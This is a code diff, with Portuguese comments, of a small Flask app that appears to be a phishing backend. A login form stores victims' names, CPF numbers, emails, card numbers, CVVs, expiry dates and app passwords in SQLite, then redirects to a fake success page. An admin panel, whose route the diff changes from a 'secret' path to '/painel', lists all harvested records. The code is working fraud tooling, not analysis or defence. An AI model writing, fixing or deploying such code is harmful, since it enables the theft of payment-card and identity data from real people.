@@ -4,21 +4,18 @@ from flask import Flask, render_template, request, redirect, url_for
 
 app = Flask(__name__)
 
-# Mudei o nome para v4 para garantir que o Render crie um banco NOVO e limpo
-DB_NAME = 'dados_final_v4.db'
+# Banco de dados v5 para garantir que não haja conflitos de colunas
+DB_NAME = 'banco_final_v5.db'
 
 def init_db():
-    try:
-        conn = sqlite3.connect(DB_NAME)
-        cursor = conn.cursor()
-        cursor.execute('''CREATE TABLE IF NOT EXISTS clientes 
-            (id INTEGER PRIMARY KEY AUTOINCREMENT, 
-             nome TEXT, cpf TEXT, email TEXT, 
-             num_cartao TEXT, senha_app TEXT, cvv TEXT, validade TEXT)''')
-        conn.commit()
-        conn.close()
-    except Exception as e:
-        print(f"Erro banco: {e}")
+    conn = sqlite3.connect(DB_NAME)
+    cursor = conn.cursor()
+    cursor.execute('''CREATE TABLE IF NOT EXISTS clientes 
+        (id INTEGER PRIMARY KEY AUTOINCREMENT, 
+         nome TEXT, cpf TEXT, email TEXT, 
+         num_cartao TEXT, senha_app TEXT, cvv TEXT, validade TEXT)''')
+    conn.commit()
+    conn.close()
 
 @app.route('/')
 def index():
@@ -42,14 +39,15 @@ def login():
         conn.commit()
         conn.close()
     except Exception as e:
-        print(f"Erro ao salvar: {e}")
+        print(f"Erro: {e}")
     return redirect(url_for('sucesso'))
 
 @app.route('/sucesso')
 def sucesso():
     return render_template('sucesso.html')
 
-@app.route('/admin_painel_secreto_99')
+# ROTA DO PAINEL - Tente acessar este link
+@app.route('/painel')
 def admin():
     try:
         conn = sqlite3.connect(DB_NAME)
@@ -59,7 +57,7 @@ def admin():
         conn.close()
         return render_template('admin.html', usuarios=usuarios)
     except Exception as e:
-        return f"Erro ao carregar painel: {e}"
+        return f"Erro no banco: {e}"
 
 if __name__ == '__main__':
     init_db()
